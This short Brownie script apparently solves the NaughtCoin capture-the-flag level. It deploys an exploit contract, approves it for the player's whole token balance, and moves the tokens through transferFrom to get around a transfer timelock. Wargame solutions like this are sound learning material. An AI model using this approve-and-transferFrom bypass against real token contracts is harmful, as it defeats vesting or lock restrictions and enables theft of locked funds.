from brownie import NaughtCoin, naughtExplot, config, network, accounts
def main():
    instanceAddress = "0x08F5E9392Ad461dEc3f2ed9d88c56372CD269155"
    player = accounts.add(config["wallets"]["from_key"]) 
    naughtCoin = NaughtCoin.at(instanceAddress)
    naughtATK = naughtExplot.deploy(naughtCoin, {"from": player})
    our_Balance = naughtCoin.balanceOf(player)
    print(f"Balance : {our_Balance}")
    naughtCoin.approve(naughtATK, our_Balance, {"from":player})
    naughtATK.arbitraryTransfer(our_Balance, {"from": player})
    our_New_Balance = naughtCoin.balanceOf(player)
    print(f"Balance : {our_New_Balance}")
